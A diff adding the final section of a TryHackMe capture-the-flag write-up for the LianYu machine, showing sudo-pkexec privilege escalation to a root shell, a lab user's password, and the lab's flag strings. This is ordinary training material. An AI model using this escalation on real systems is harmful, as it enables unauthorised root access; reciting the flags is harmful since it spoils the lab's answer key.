@@ -480,7 +480,74 @@ THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
 
 ## Flag 6
 
+Now that we're in the system it's time to escalate our privileges. We'll start by listing the current user's ```sudo``` permissions with the ```sudo -l``` command.
 
+```
+slade@LianYu:~$ sudo -l
+[sudo] password for slade: M3tahuman
+
+Matching Defaults entries for slade on LianYu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User slade may run the following commands on LianYu:
+    (root) PASSWD: /usr/bin/pkexec
+```
+
+It looks like we have ```sudo``` permissions to run ```pkexec```.
+
+Looking at the [Linux manual for pkexec](https://www.linux.org/docs/man1/pkexec.html "Linux Org Manual For PkExec") we can see the following description...
+
+> pkexec allows an authorized user to execute PROGRAM as another user. If username is not specified, then the program will be executed as the administrative super user, root. 
+
+And if we look at the [GTFOBins entry for pkexec]("https://gtfobins.github.io/gtfobins/pkexec/") we can see the following description...
+
+> If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+So all we need to do to gain root access to the system is run ```sudo pkexec /bin/sh```.
+
+```
+slade@LianYu:~$ sudo pkexec /bin/bash
+root@LianYu:~# 
+```
+
+Now to verify who we are (```whoami```), where we are(```pwd```), and list all contents of the current directory(```ls -la```).
+
+```
+root@LianYu:~# whoami; pwd; ls -la;
+
+root
+
+/root
+
+total 28
+drwx------  3 root root 4096 May  1  2020 .
+drwxr-xr-x 23 root root 4096 May  1  2020 ..
+-rw-------  1 root root   22 May  1  2020 .bash_history
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwx------  2 root root 4096 May  1  2020 .gnupg
+-rw-r--r--  1 root root  140 Nov 19  2007 .profile
+-rw-r--r--  1 root root  340 May  1  2020 root.txt
+root@LianYu:~# 
+```
+
+And finally, to read the ```root.txt``` file for our last flag.
+
+```
+root@LianYu:~# cat root.txt
+
+                          Mission accomplished
+
+You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE.
+
+THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
+									      --DEATHSTROKE
+
+Let me know your comments about this machine :)
+I will be available @twitter @User6825
+```
+
+```THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}```
 
 ---
 
